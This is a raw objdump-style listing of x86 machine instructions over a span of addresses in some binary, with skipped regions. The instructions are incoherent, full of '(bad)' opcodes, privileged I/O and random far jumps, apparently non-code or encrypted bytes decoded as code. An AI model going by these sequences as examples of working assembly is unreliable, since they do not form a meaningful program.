  422bb8:	fsubr  QWORD PTR [edi+0x7f]
  422bbb:	push   esi
  422bbc:	icebp  
  422bbd:	jmp    0x422bb7
  422bbf:	cdq    
  422bc0:	bound  eax,QWORD PTR [ebp+0x29]
  422bc3:	and    al,0x9c
  422bc5:	jge    0x422b4c
  422bc7:	pop    eax
  422bc8:	pop    es
  422bc9:	xor    al,0xbe
  422bcb:	push   ebp
  422bcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bcd:	mov    bh,bl
  422bcf:	add    DWORD PTR [edi+0x495def36],ebp
  422bd5:	fsubr  DWORD PTR [eax]
  422bd7:	push   0xa66d11f9
  422bdc:	loop   0x422c5b
  422bde:	inc    ebp
  422bdf:	pusha  
  422be0:	dec    eax
  422be1:	xor    DWORD PTR [eax+ecx*1-0x17],edx
  422be5:	mov    dl,0x31
  422be7:	xor    bl,BYTE PTR [ebp-0xb]
  422bea:	(bad)  
  422beb:	push   ecx
  422bec:	cmp    eax,0x5c
	...
  422c55:	add    BYTE PTR [edi+esi*1+0x4a],al
  422c59:	fwait
  422c5a:	jnp    0x422c5b
  422c5c:	aad    0xff
  422c5e:	sbb    dl,BYTE PTR [edx+0x70f84d9c]
  422c64:	xlat   BYTE PTR ds:[ebx]
  422c65:	jmp    0x100:0x17567
  422c6c:	add    BYTE PTR [eax],al
  422c6e:	mov    bh,0x2b
  422c70:	xor    al,0xa0
  422c72:	jmp    0x3ab4:0xdfaec06a
  422c79:	dec    esp
  422c7a:	adc    bh,BYTE PTR [edi]
  422c7c:	mov    cl,0xf7
  422c7e:	and    eax,0xdca0a76c
  422c83:	sub    BYTE PTR [ecx-0x21625903],ah
  422c89:	mov    esi,0xec79e07a
  422c8e:	jo     0x422caa
  422c90:	leave  
  422c91:	(bad)
  422c94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c95:	test   DWORD PTR [ecx-0x2d],0x1d1156e2
  422c9c:	push   ebp
  422c9d:	retf   
  422c9e:	jmp    0x241c:0x8c551b7a
  422ca5:	jb     0x422cae
  422ca7:	pushf  
  422ca8:	pop    eax
  422ca9:	jnp    0x422cb6
  422cab:	(bad)  [eax+ebp*2]
  422cae:	aaa    
  422caf:	or     edx,DWORD PTR [esi-0x11]
  422cb2:	dec    esp
  422cb3:	and    eax,0x1cef5f8f
  422cb8:	sub    al,0x56
  422cba:	jmp    0x100c25d3
  422cbf:	jge    0x422cda
  422cc1:	sub    eax,0xbe13912e
  422cc6:	push   ss
  422cc7:	shr    DWORD PTR [edx],0x55
  422cca:	xchg   ecx,eax
  422ccb:	aas    
  422ccc:	std    
  422ccd:	jo     0x422ca2
  422ccf:	push   ebp
  422cd0:	xchg   esp,eax
  422cd1:	jno    0x422c86
  422cd3:	fnclex 
  422cd5:	ret    0x2cdb
  422cd8:	cld    
  422cd9:	lea    ebx,[esi+0x7c]
  422cdc:	inc    ebp
  422cdd:	(bad)  
  422cde:	jno    0x422c87
  422ce0:	jns    0x422d06
  422ce2:	jl     0x422c73
  422ce4:	cdq    
  422ce5:	inc    eax
  422ce6:	and    eax,0xc6f51c69
  422ceb:	dec    edi
  422cec:	mov    ds:0x9873e5a8,eax
  422cf1:	mov    esp,0x212f1424
  422cf6:	pop    ss
  422cf7:	js     0x422c88
  422cf9:	es sahf 
  422cfb:	(bad)  
  422cfc:	pop    ss
  422cfd:	pop    edi
  422cfe:	sti    
  422cff:	adc    esi,edx
  422d01:	mov    edx,?
  422d03:	jno    0x422d55
  422d05:	in     eax,0x82
  422d07:	imul   ah
  422d09:	lahf   
  422d0a:	(bad)  
  422d0b:	rcr    BYTE PTR [eax],cl
  422d0d:	mov    es,WORD PTR [ebx*2-0x70ba6bab]
  422d14:	outs   dx,BYTE PTR ds:[esi]
  422d15:	mov    edi,0x989bcb42
  422d1a:	xchg   edi,eax
  422d1b:	xchg   edi,eax
  422d1c:	mov    ecx,0x78df7bd5
  422d21:	push   ebx
  422d22:	mov    ecx,0x72ec8ea5
  422d27:	pop    edi
  422d28:	test   DWORD PTR [eax+eiz*1],esp
  422d2b:	aaa    
  422d2c:	loopne 0x422cd3
  422d2e:	sti    
  422d2f:	lock cs jbe 0x422cd8
  422d33:	fcom   st(6)
  422d35:	into   
  422d36:	mov    ebp,es
  422d38:	sti    
  422d39:	jmp    0x636b4d4f
  422d3e:	xchg   BYTE PTR [ecx+0x33be43c6],dl
  422d44:	arpl   WORD PTR [eax-0x1f],si
  422d47:	push   0x214d778b
  422d4c:	push   ss
  422d4d:	adc    ebx,ebp
  422d4f:	aad    0x47
  422d51:	push   edx
  422d52:	aaa    
  422d53:	mov    DWORD PTR [edx+0xd],edx
  422d56:	lea    edx,[ecx+0x31110636]
  422d5c:	or     al,0x94
  422d5e:	xor    bl,cl
  422d60:	mov    ch,0x7e
  422d62:	fs inc esp
  422d64:	fst    QWORD PTR [edi+0x57]
  422d67:	lahf   
  422d68:	std    
  422d69:	push   ss
  422d6a:	push   ebp
  422d6b:	and    ebp,0x79
	...
  422dd6:	mov    edi,0x626d60bd
  422ddb:	std    
  422ddc:	mov    edi,0x80797fff
  422de1:	sub    edx,edi
  422de3:	rcr    bl,0x4e
  422de6:	addr16 jbe 0x422dea
  422de9:	add    BYTE PTR [eax],al
  422deb:	add    DWORD PTR [eax],eax
  422ded:	add    BYTE PTR [ebp-0x9414cff],cl
  422df3:	aam    0x29
  422df5:	xor    BYTE PTR [edx-0x1d],0x46
  422df9:	mov    ds:0x4ab78ac1,eax
  422dfe:	sahf   
  422dff:	push   edx
  422e00:	mov    DWORD PTR [ecx+0x1dc10019],esp
  422e06:	sub    al,0x1c
  422e08:	mov    bh,BYTE PTR [ebx-0x5f0e317]
  422e0e:	ror    BYTE PTR [ebp+0x4be2d683],cl
  422e14:	push   ebp
  422e15:	and    eax,0x2b766334
  422e1a:	pop    ebx
  422e1b:	cmp    dl,ch
  422e1d:	cmp    eax,DWORD PTR [ebx]
  422e1f:	repnz add BYTE PTR [edi-0x41],bh
  422e23:	adc    eax,0x4be0d2ef
  422e28:	pop    ds
  422e29:	add    al,0x49
  422e2b:	jbe    0x422e90
  422e2d:	pop    es
  422e2e:	inc    edi
  422e2f:	pop    ebp
  422e30:	jb     0x422df9
  422e32:	das    
  422e33:	mov    eax,0xc0a70e92
  422e38:	je     0x422e1d
  422e3a:	and    ebx,esp
  422e3c:	fisubr DWORD PTR [eax]
  422e3e:	out    dx,al
  422e3f:	out    dx,al
  422e40:	outs   dx,BYTE PTR ds:[esi]
  422e41:	aas    
  422e42:	out    0xb8,al
  422e44:	nop
  422e45:	(bad)  
  422e46:	loop   0x422e6e
  422e48:	(bad)  
  422e49:	push   eax
  422e4a:	adc    DWORD PTR [ebp+0x4c438b98],ebx
  422e50:	sub    ah,BYTE PTR [esi-0x42]
  422e53:	cmp    DWORD PTR [ebx+0x37],edi
  422e56:	push   ds
  422e57:	push   edi
  422e58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e59:	(bad)  
  422e5a:	jle    0x422e51
  422e5c:	and    cl,BYTE PTR [ecx-0x2d]
  422e5f:	pop    ss
  422e60:	test   eax,0x8fde95d0
  422e65:	push   DWORD PTR [ecx-0x7e]
  422e68:	cmp    ch,BYTE PTR [eax]
  422e6a:	inc    ebp
  422e6b:	aad    0x98
  422e6d:	jmp    0x422ee2
  422e6f:	mov    WORD PTR [edx+0x214c11b2],fs
  422e75:	aaa    
  422e76:	and    al,0x12
  422e78:	repz iret 
  422e7a:	out    0xe7,al
  422e7c:	ret    0x2f52
  422e7f:	and    DWORD PTR [esi+0x20],esp
  422e82:	dec    edi
  422e83:	ins    BYTE PTR es:[edi],dx
  422e84:	outs   dx,DWORD PTR ds:[esi]
  422e85:	push   esp
  422e86:	add    DWORD PTR [ebp+0x3f416972],0xffffff98
  422e8d:	bound  ebx,QWORD PTR [ebx]
  422e8f:	aad    0x4a
  422e91:	ds test eax,0xb7fd6b5e
  422e97:	push   ss
  422e98:	ss cld 
  422e9a:	jno    0x422ed9
  422e9c:	push   esp
  422e9d:	push   0x926771cc
  422ea2:	xor    DWORD PTR ds:0xe83f09d9,0xffffff8c
  422ea9:	or     dl,BYTE PTR [ebp+0x48026fe4]
  422eaf:	jnp    0x422e33
  422eb1:	ja     0x422f22
  422eb3:	or     edx,ebp
  422eb5:	ins    BYTE PTR es:[edi],dx
  422eb6:	jns    0x422e6e
  422eb8:	dec    eax
  422eb9:	fwait
  422eba:	inc    ebp
  422ebb:	in     al,dx
  422ebc:	push   0xffffffe8
  422ebe:	inc    esp
  422ebf:	aaa    
  422ec0:	jo     0x422e92
  422ec2:	popa   
  422ec3:	in     al,dx
  422ec4:	sbb    edi,DWORD PTR [edi]
  422ec6:	mov    ah,0xfa
  422ec8:	mov    ch,0x41
  422eca:	call   0x9cd2ab43
  422ecf:	lds    edx,FWORD PTR [ecx]
  422ed1:	and    ah,al
  422ed3:	fstp   QWORD PTR [edi+edi*2-0x2b]
  422ed7:	popf   
  422ed8:	loope  0x422e63
  422eda:	xchg   edi,eax
  422edb:	sub    eax,0x4ad18495
  422ee0:	in     al,0x8
  422ee2:	pop    ss
  422ee3:	mul    esp
  422ee5:	jne    0x422f37
  422ee7:	xor    ebx,0xffffffb0
  422eea:	pop    esi
  422eeb:	scas   al,BYTE PTR es:[edi]
  422eec:	rcl    BYTE PTR [ecx+0x0],cl
	...
  422f53:	add    BYTE PTR [eax],al
  422f55:	add    BYTE PTR [ebx-0x21e677ab],al
  422f5b:	fst    QWORD PTR [ebx+0x33b808df]
  422f61:	retf   0x364e
  422f64:	(bad)  
  422f65:	aaa    
  422f66:	addr16 ja 0x422f6a
  422f69:	add    BYTE PTR [eax],al
  422f6b:	add    DWORD PTR [eax],eax
  422f6d:	add    BYTE PTR [ecx],dl
  422f6f:	dec    eax
  422f70:	add    bh,BYTE PTR [ebx+0x1f]
  422f73:	xor    eax,0x1ec2277c
  422f78:	pop    ss
  422f79:	xor    bh,BYTE PTR [esi+eax*1-0x26]
  422f7d:	cmp    al,0x8d
  422f7f:	and    BYTE PTR [ecx+0x34],bh
  422f82:	cld    
  422f83:	stos   BYTE PTR es:[edi],al
  422f84:	dec    eax
  422f85:	popa   
  422f86:	fs xchg edi,eax
  422f88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f89:	sti    
  422f8a:	icebp  
  422f8b:	cmp    eax,DWORD PTR [ecx-0x1f8893a4]
  422f91:	dec    ebp
  422f92:	js     0x422fae
  422f94:	pusha  
  422f95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f96:	jg     0x422fd5
  422f98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f99:	pop    edi
  422f9a:	ror    ecx,cl
  422f9c:	xor    al,0xc3
  422f9e:	xor    cl,bh
  422fa0:	cmp    BYTE PTR [ebx+0x6a],0x92
  422fa4:	ror    BYTE PTR [eax-0x32],cl
  422fa7:	psrld  mm1,QWORD PTR [ebp+0xe28f080]
  422fae:	sub    al,0xb3
  422fb0:	and    eax,0xa2e71839
  422fb5:	enter  0xd514,0xcc
  422fb9:	mov    dh,BYTE PTR [edi-0x67]
  422fbc:	sub    BYTE PTR [edi+0x24dbf465],bh
  422fc2:	and    dl,ah
  422fc4:	push   0x3fd91c9a
  422fc9:	outs   dx,DWORD PTR ds:[esi]
  422fca:	add    dl,BYTE PTR [edi-0x409a6416]
  422fd0:	jne    0x422ff1
  422fd2:	call   0x9da0:0xc9ae4e78
  422fd9:	addr16 xchg edx,eax
  422fdb:	in     al,dx
  422fdc:	data16 (bad) 
  422fde:	in     eax,dx
  422fdf:	jmp    0x423055
  422fe1:	fcomp  DWORD PTR [ebp+0x21]
  422fe4:	cmp    ch,bl
  422fe6:	inc    ebx
  422fe7:	dec    esi
  422fe8:	fs add dl,al
  422feb:	stc    
  422fec:	mov    cl,0x89
  422fee:	mov    ds:0x4474c064,al
  422ff3:	iret   
  422ff4:	or     al,dh
  422ff6:	pop    esi
  422ff7:	inc    esp
  422ff8:	add    eax,0x4f07d5e7
  422ffd:	sbb    ecx,DWORD PTR [ebx-0x1c]
  423000:	and    eax,0xcc5c5976
  423005:	jb     0x42302d
  423007:	sub    ch,0x43
  42300a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42300b:	add    eax,0x9376c113
  423010:	pop    esp
  423011:	or     dh,BYTE PTR [edi-0x386ff4dc]
  423017:	adc    al,0x3b
  423019:	lds    ebp,FWORD PTR [edi]
  42301b:	adc    al,0x9d
  42301d:	shr    BYTE PTR [edi-0xd],0xe1
  423021:	fwait
  423022:	bound  esi,QWORD PTR ds:0x27f458d5
  423028:	iret   
  423029:	sti    
  42302a:	xchg   esi,eax
  42302b:	xor    dl,BYTE PTR [edi-0x2e]
  42302e:	mov    esi,0x9b93ff51
  423033:	std    
  423034:	js     0x422fe4
  423036:	loope  0x423035
  423038:	pop    ds
  423039:	jmp    0x6140:0xb1c21e5b
  423040:	mov    esp,0x5cb9f9e4
  423045:	test   eax,0x657868ba
  42304a:	or     eax,0x6630c841
  42304f:	dec    esi
  423050:	add    al,0xee
  423052:	sahf   
  423053:	push   ds
  423054:	nop
  423055:	lea    ebp,[edi-0x1f]
  423058:	cmc    
  423059:	out    0x6b,eax
  42305b:	stos   BYTE PTR es:[edi],al
  42305c:	out    0x6a,al
  42305e:	aad    0x37
  423060:	std    
  423061:	xor    dh,BYTE PTR [ecx]
  423063:	adc    BYTE PTR [edx+0x670a2d1c],0xc1
  42306a:	ins    DWORD PTR es:[edi],dx
  42306b:	mov    db1,ebx
	...
  4230d6:	inc    esi
  4230d7:	in     al,0x62
  4230d9:	mov    dl,ah
  4230db:	mov    gs,esi
  4230dd:	out    dx,al
  4230de:	sub    ecx,ebx
  4230e0:	sbb    DWORD PTR [ebx+edx*4+0x6729121d],esp
  4230e7:	js     0x4230ea
  4230e9:	add    BYTE PTR [eax],al
  4230eb:	add    DWORD PTR [eax],eax
  4230ed:	add    BYTE PTR ds:0x38e48854,cl
  4230f3:	cmc    
  4230f4:	xchg   edi,eax
  4230f5:	aad    0x74
  4230f7:	sub    bl,BYTE PTR [edx]
  4230f9:	cli    
  4230fa:	push   DWORD PTR [esi-0x29]
  4230fd:	dec    esp
  4230fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230ff:	mov    ah,BYTE PTR [esi+0x66a32881]
  423105:	sub    al,0x25
  423107:	mov    al,0xc7
  423109:	mov    ch,0x92
  42310b:	and    eax,0xf685ef91
  423110:	sbb    ecx,edx
  423112:	adc    BYTE PTR [ebx-0x52],ch
  423115:	icebp  
  423116:	mov    ecx,0x28b4709d
  42311b:	(bad)  
  42311c:	push   esp
  42311d:	ret    
  42311e:	cs daa 
  423120:	retf   
  423121:	xchg   edx,eax
  423122:	(bad)  
  423123:	xor    DWORD PTR ds:0xe2cac2f8,ebp
  423129:	pop    edx
  42312a:	shl    dh,0x43
  42312d:	xchg   edx,eax
  42312e:	pusha  
  42312f:	xchg   edi,eax
  423130:	xor    ah,BYTE PTR [ecx-0x2a1e92db]
  423136:	rol    BYTE PTR [edx+esi*2],0x58
  42313a:	ds xchg esp,eax
  42313c:	sbb    al,0x37
  42313e:	jne    0x423144
  423140:	inc    edx
  423141:	clc    
  423142:	ret    0x90df
  423145:	stos   BYTE PTR es:[edi],al
  423146:	inc    esp
  423147:	xor    BYTE PTR [ecx-0x2a],al
  42314a:	inc    ebx
  42314b:	(bad)  
  42314d:	ins    BYTE PTR es:[edi],dx
  42314e:	jns    0x423177
  423150:	xchg   edx,eax
  423151:	mov    ds:0x4dac77ca,eax
  423156:	mov    esp,0x6ca60b6
  42315b:	cmp    eax,ecx
  42315d:	dec    ecx
  42315e:	xchg   esp,eax
  42315f:	mov    al,0x1d
  423161:	int    0x47
  423163:	aam    0x75
  423165:	jns    0x4231b8
  423167:	sub    al,bh
  423169:	sbb    BYTE PTR [eax+0x8d335fd],bh
  42316f:	jle    0x42312c
  423171:	cs cmp BYTE PTR fs:[ebp+0x21],cl
  423176:	cdq    
  423177:	xchg   edx,eax
  423178:	push   ebx
  423179:	push   ebp
  42317a:	loopne 0x4231b8
  42317c:	nop
  42317d:	adc    DWORD PTR [ecx+0x2],esi
  423180:	add    eax,0x1d17f4da
  423185:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423186:	ret    
  423187:	jg     0x423127
  423189:	sub    eax,0xde9e12fe
  42318e:	fst    QWORD PTR [edi+0x1e44dcd6]
  423194:	mov    ds:0xf4aa4146,al
  423199:	xor    eax,0x688554e7
  42319e:	pushf  
  42319f:	xlat   BYTE PTR ds:[ebx]
  4231a0:	dec    edx
  4231a1:	cmc    
  4231a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231a3:	xor    eax,DWORD PTR [edi+eiz*4+0x30d10d4f]
  4231aa:	rol    DWORD PTR [eax+0x6f],cl
  4231ad:	and    BYTE PTR [edi+eax*4],ah
  4231b0:	icebp  
  4231b1:	sti    
  4231b2:	pop    es
  4231b3:	lea    ebx,[eax+0x35106753]
  4231b9:	mov    al,0xf3
  4231bb:	int    0x17
  4231bd:	push   edi
  4231be:	sub    BYTE PTR [eax+edi*4],ch
  4231c1:	jne    0x423184
  4231c3:	inc    esp
  4231c4:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4231c6:	jecxz  0x423159
  4231c8:	into   
  4231c9:	inc    esi
  4231ca:	sub    DWORD PTR [edx-0x37c92289],esp
  4231d0:	mov    bl,0x71
  4231d2:	fcom   st(1)
  4231d4:	scas   al,BYTE PTR es:[di]
  4231d6:	fnstcw WORD PTR es:[esi-0x15fef3c8]
  4231dd:	inc    eax
  4231df:	mov    cl,0xb8
  4231e1:	mov    eax,0x91712a36
  4231e6:	push   cs
  4231e7:	jnp    0x4231f9
  4231e9:	push   0xffffffc3
  4231eb:	pop    esp
  4231ec:	and    DWORD PTR [edx],ebp
	...
  423256:	jns    0x423249
  423258:	div    DWORD PTR [ecx-0x6804801]
  42325e:	in     al,0xe0
  423260:	sub    DWORD PTR [edx+0x4ff7e4f1],esp
  423266:	addr16 jns 0x42326a
  423269:	add    BYTE PTR [eax],al
  42326b:	add    DWORD PTR [eax],eax
  42326d:	add    BYTE PTR [edi],bl
  42326f:	mov    bl,0x4d
  423271:	scas   eax,DWORD PTR es:[edi]
  423272:	pop    es
  423273:	dec    ebp
  423274:	cli    
  423275:	jne    0x423282
  423277:	push   0x731b8971
  42327c:	and    edi,ebp
  42327e:	mov    bl,0x95
  423280:	or     al,0xa0
  423282:	pop    esp
  423283:	xchg   edx,eax
  423284:	push   esp
  423285:	repz out dx,al
  423287:	sbb    ecx,ebp
  423289:	cmp    eax,0x172993f6
  42328e:	sahf   
  42328f:	stos   BYTE PTR es:[edi],al
  423290:	ror    DWORD PTR [esi+0x1bb3a365],1
  423296:	xchg   esi,eax
  423297:	xchg   ebp,eax
  423298:	jbe    0x4232c7
  42329a:	sahf   
  42329b:	dec    ebx
  42329c:	jmp    0x76db705b
  4232a1:	and    edx,DWORD PTR [edi+esi*8]
  4232a4:	dec    ecx
  4232a5:	sbb    esp,edi
  4232a7:	test   DWORD PTR [ebx+0x32e9f984],esi
  4232ad:	sbb    DWORD PTR ds:0xad7d7c19,ecx
  4232b3:	rcl    BYTE PTR [esi+0x76],0x8f
  4232b7:	test   BYTE PTR [ebp-0x2d88d72d],dh
  4232bd:	pushf  
  4232be:	jg     0x4232dd
  4232c0:	pop    ecx
  4232c1:	jg     0x4232cd
  4232c3:	shl    DWORD PTR [edx],1
  4232c5:	dec    edx
  4232c6:	je     0x423303
  4232c8:	retf   
  4232c9:	ret    0xbcc
  4232cc:	and    ecx,DWORD PTR fs:[edx-0x34552f62]
  4232d3:	mov    ds:0x50f6c654,eax
  4232d8:	imul   eax,DWORD PTR [ebx-0x15],0xf
  4232dc:	xor    eax,0x7f7d6fd8
  4232e1:	lea    ecx,[esi]
  4232e3:	xchg   esp,eax
  4232e4:	outs   dx,BYTE PTR ds:[esi]
  4232e5:	mov    ebp,edx
  4232e7:	jns    0x423358
  4232e9:	mov    eax,ds:0xd464a130
  4232ee:	lods   al,BYTE PTR ds:[esi]
  4232ef:	ret    
  4232f0:	jbe    0x423298
  4232f2:	jge    0x42334d
  4232f4:	scas   eax,DWORD PTR es:[edi]
  4232f5:	xchg   edx,eax
  4232f6:	xlat   BYTE PTR ds:[ebx]
  4232f7:	xchg   esp,eax
  4232f8:	dec    esp
  4232f9:	cld    
  4232fa:	cs or  al,0x68
  4232fd:	sahf   
  4232fe:	cli    
  4232ff:	cmp    eax,ebp
  423301:	or     eax,0xcf2a2acb
  423306:	inc    edi
  423307:	(bad)  [eax+0x7648231a]
  42330d:	xchg   ecx,eax
  42330e:	xchg   edx,eax
  42330f:	sub    eax,0xbf11148a
  423314:	(bad)  
  423315:	inc    esp
  423316:	idiv   BYTE PTR [esi]
  423318:	mov    dl,0x2a
  42331a:	loopne 0x423331
  42331c:	stc    
  42331d:	rcl    DWORD PTR [esp+eax*4],cl
  423320:	sbb    BYTE PTR [ecx-0x74a7ac59],bl
  423326:	scas   al,BYTE PTR es:[edi]
  423327:	xchg   edx,eax
  423328:	push   eax
  423329:	imul   BYTE PTR [edx+0x18]
  42332c:	(bad)  
  42332d:	sub    eax,0x19480f80
  423332:	out    0x2b,eax
  423334:	and    DWORD PTR [ebp+0x7627082e],ecx
  42333a:	enter  0x2a93,0x9f
  42333e:	ja     0x4232d2
  423340:	inc    edx
  423341:	pop    ecx
  423342:	in     al,0xd0
  423344:	aad    0x85
  423346:	mov    eax,ds:0x202e5619
  42334b:	ins    BYTE PTR es:[edi],dx
  42334c:	mov    ebp,0x94042c83
  423351:	in     eax,dx
  423352:	neg    esp
  423354:	je     0x42336e
  423356:	push   esp
  423357:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423358:	fwait
  423359:	xor    eax,DWORD PTR [edi-0x213daea3]
  42335f:	xor    BYTE PTR [ebx],bl
  423361:	(bad)  
  423362:	test   DWORD PTR [ebx],0x9b3dcac7
  423368:	dec    ebp
  423369:	jmp    0x0:0x92a22922
	...
  4233d4:	add    BYTE PTR [eax],al
  4233d6:	clc    
  4233d7:	fisub  WORD PTR [edx+0x30]
  4233da:	mov    sp,0xdefa
  4233de:	mov    eax,fs:0x2d350f44
  4233e4:	add    BYTE PTR [eax+0x17a67],dl
  4233ea:	add    BYTE PTR [ecx],al
  4233ec:	add    BYTE PTR [eax],al
  4233ee:	push   esp
  4233ef:	push   ecx
  4233f0:	mov    dh,0x4f
  4233f2:	lods   al,BYTE PTR ds:[esi]
  4233f3:	xor    al,0xcb
  4233f5:	cdq    
  4233f6:	xchg   ebp,eax
  4233f7:	fdivrp st(6),st
  4233f9:	adc    eax,0xc69d5dd6
  4233fe:	mov    dh,BYTE PTR [edi-0x26]
  423401:	xchg   ebx,esi
  423403:	ins    DWORD PTR es:[edi],dx
  423404:	or     esp,DWORD PTR [ecx]
  423406:	out    0x95,al
  423408:	xor    cl,BYTE PTR [ebp-0x50]
  42340b:	sub    dh,cl
  42340d:	shr    DWORD PTR [ebp-0x1b95b4b8],cl
  423413:	push   ebx
  423414:	pop    esi
  423415:	push   edi
  423416:	mov    bl,0xe
  423418:	in     eax,dx
  423419:	mov    esi,0x1a93fdcc
  42341e:	sbb    DWORD PTR [esi],edi
  423420:	ja     0x4233c7
  423422:	pop    ebx
  423423:	and    bl,ah
  423425:	push   ecx
  423426:	shr    esp,1
  423428:	sti    
  423429:	push   ss
  42342a:	out    dx,eax
  42342b:	mov    ah,BYTE PTR fs:[ebx+0x14]
  42342f:	adc    DWORD PTR [eax+0x2f],0xae524bf7
  423436:	adc    al,0xdd
  423438:	imul   edx,DWORD PTR [ecx],0x2e
  42343b:	jmp    0xb7db:0x6bcfcf6a
  423442:	dec    ebp
  423443:	push   0xee46096f
  423448:	(bad)  
  423449:	ds loop 0x42343f
  42344c:	xchg   esp,eax
  42344d:	cmc    
  42344e:	shr    DWORD PTR [esi],0x72
  423451:	sub    al,0xce
  423453:	or     ebx,DWORD PTR [edi]
  423455:	xor    eax,0x95fab93f
  42345a:	xchg   ebx,eax
  42345b:	push   edi
  42345c:	int    0x7f
  42345e:	jmp    0x757d:0x4285e28e
  423465:	adc    cl,BYTE PTR [esi-0x3c48415f]
  42346b:	cld    
  42346c:	mov    esi,0x46b614ab
  423471:	leave  
  423472:	mov    ebx,0xb115de7f
  423477:	jle    0x423416
  423479:	bound  ebp,QWORD PTR [ebx-0x7ddf153f]
  42347f:	and    eax,DWORD PTR [ebx+edi*2+0x4e90c584]
  423486:	cdq    
  423487:	xchg   edx,eax
  423488:	inc    ebp
  423489:	mov    eax,ds:0x3e7653d2
  42348e:	mov    ch,0xe
  423490:	fdivr  DWORD PTR [edx-0x632c5a8]
  423496:	stc    
  423497:	adc    ah,bl
  423499:	das    
  42349a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42349b:	cld    
  42349c:	pusha  
  42349d:	jb     0x423478
  42349f:	mov    ebx,0x14b9ef42
  4234a4:	xor    eax,0xed62887e
  4234a9:	out    0x5f,al
  4234ab:	sbb    dl,BYTE PTR [eax]
  4234ad:	xor    eax,0x1fcc4a99
  4234b2:	push   edx
  4234b3:	rcl    DWORD PTR [edx],1
  4234b5:	jge    0x4234bb
  4234b7:	mov    WORD PTR [ebx-0x71],gs
  4234ba:	push   ds
  4234bb:	xchg   esp,eax
  4234bc:	in     eax,dx
  4234bd:	mov    al,ds:0x9cc69b29
  4234c2:	dec    ecx
  4234c3:	dec    ecx
  4234c4:	pop    DWORD PTR [eax-0x5c]
  4234c7:	(bad)  
  4234c8:	les    ecx,FWORD PTR [eax-0x14fb9cd6]
  4234ce:	push   es
  4234cf:	jecxz  0x423473
  4234d1:	das    
  4234d2:	retf   
  4234d3:	xor    edi,edi
  4234d5:	xor    eax,0xe7ac775f
  4234da:	xor    DWORD PTR [eax],ecx
  4234dc:	lods   eax,DWORD PTR ds:[esi]
  4234dd:	or     esp,DWORD PTR [edx]
  4234df:	loopne 0x423550
  4234e1:	fwait
  4234e2:	mov    ebx,0x8ebbb63e
  4234e7:	xchg   esp,eax
  4234e8:	pop    edi
  4234e9:	lea    ebx,[eax]
  4234eb:	aas    
  4234ec:	cs xor eax,0x0
	...
  423556:	shl    BYTE PTR [eax-0x8a90bb],0xea
  42355d:	mov    edi,0x1fadf467
  423562:	push   ebx
  423563:	sbb    DWORD PTR [ebx],ebp
  423565:	sbb    DWORD PTR [edi+0x7b],esp
  423568:	add    DWORD PTR [eax],eax
  42356a:	add    BYTE PTR [ecx],al
  42356c:	add    BYTE PTR [eax],al
  42356e:	mov    edx,0x448fdb0e
  423573:	adc    DWORD PTR [ebp-0x44e9d3f4],0x8beeee01
  42357d:	cmp    DWORD PTR [eax+0x26173088],ebp
  423583:	int3   
  423584:	jo     0x42354d
  423586:	mov    DWORD PTR [esi+0x16586696],edi
  42358c:	push   0xffffffac
  42358e:	push   ebx
  42358f:	ret    
  423590:	ror    ebx,cl
  423592:	jne    0x4235a0
  423594:	adc    eax,0x4ad77a0f
  423599:	int    0x87
  42359b:	push   ecx
  42359c:	inc    BYTE PTR [ebx]
  42359e:	pop    ebp
  42359f:	add    eax,0xd1fee3f1
  4235a4:	inc    ecx
  4235a5:	mov    edx,0xeb1505fb
  4235aa:	inc    edx
  4235ab:	mov    ch,BYTE PTR [eax+ebp*8+0x3108476c]
  4235b2:	lea    ecx,[ecx+eiz*4+0x7b]
  4235b6:	or     eax,0x9335aefd
  4235bb:	or     al,0x85
  4235bd:	jmp    0xc5b73111
  4235c2:	(bad)  
  4235c3:	int3   
  4235c4:	in     al,dx
  4235c5:	and    ebp,DWORD PTR [edi+0x4b936aeb]
  4235cb:	inc    eax
  4235cc:	clc    
  4235cd:	mov    edi,0xb635bf3f
  4235d2:	fwait
  4235d3:	jecxz  0x4235ed
  4235d5:	cmp    al,0xac
  4235d7:	xchg   ebx,eax
  4235d8:	xor    eax,0x17
  4235db:	dec    ebp
  4235dc:	sti    
  4235dd:	adc    eax,0x69d00fc
  4235e2:	jg     0x4235a3
  4235e4:	sub    eax,0x48ded735
  4235e9:	fist   WORD PTR [ecx+0x61208d4]
  4235ef:	shr    ebp,cl
  4235f1:	adc    ebx,edi
  4235f3:	clc    
  4235f4:	push   edx
  4235f5:	jg     0x4235c0
  4235f7:	mov    eax,0xd275b1e3
  4235fc:	ss mov ecx,0x25e6ae34
  423602:	dec    ebx
  423603:	xchg   esp,eax
  423604:	xchg   ebp,eax
  423605:	popa   
  423606:	mov    edx,0xfad86ea3
  42360b:	and    eax,0xe91aeab1
  423610:	jle    0x42360e
  423612:	sti    
  423613:	jge    0x4235f7
  423615:	(bad)  
  423616:	mov    ds:0x1dcd7935,al
  42361b:	pop    ds
  42361c:	jb     0x423628
  42361e:	addr16 dec esi
  423620:	pop    ds
  423621:	push   0x4f4ffe58
  423626:	mov    eax,edi
  423628:	mov    es,WORD PTR [edx-0x37196fd]
  42362e:	ficom  DWORD PTR [eax]
  423630:	test   eax,0x3b217fb8
  423635:	xor    eax,0x8428ad43
  42363a:	(bad)  
  42363b:	push   0xe76b328b
  423640:	push   edi
  423641:	(bad)  
  423642:	fist   WORD PTR [ecx]
  423644:	adc    al,0x1c
  423646:	push   edx
  423647:	je     0x42369d
  423649:	pop    edi
  42364a:	ins    DWORD PTR es:[edi],dx
  42364b:	pop    es
  42364c:	fwait
  42364d:	sub    al,dl
  42364f:	or     dl,bl
  423651:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423652:	test   DWORD PTR [ebx],ebx
